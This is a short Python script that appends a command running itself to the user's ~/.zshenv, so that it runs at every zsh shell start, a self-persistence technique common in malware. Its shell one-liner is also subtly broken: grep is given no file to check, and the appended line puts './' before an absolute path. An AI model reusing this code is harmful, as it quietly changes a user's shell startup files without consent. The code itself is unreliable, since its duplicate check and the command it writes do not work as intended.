import os
import sys

# following steps from: https://stackoverflow.com/questions/595305/how-do-i-get-the-path-of-the-python-script-i-am-running-in

abs_path = os.path.abspath(sys.argv[0])

abs_name = f"'{abs_path}'"

os.system(f'[ -f ~/.zshenv ] && grep -F {abs_name} > /dev/null && exit 0 ; echo "./{abs_name}" >> ~/.zshenv')
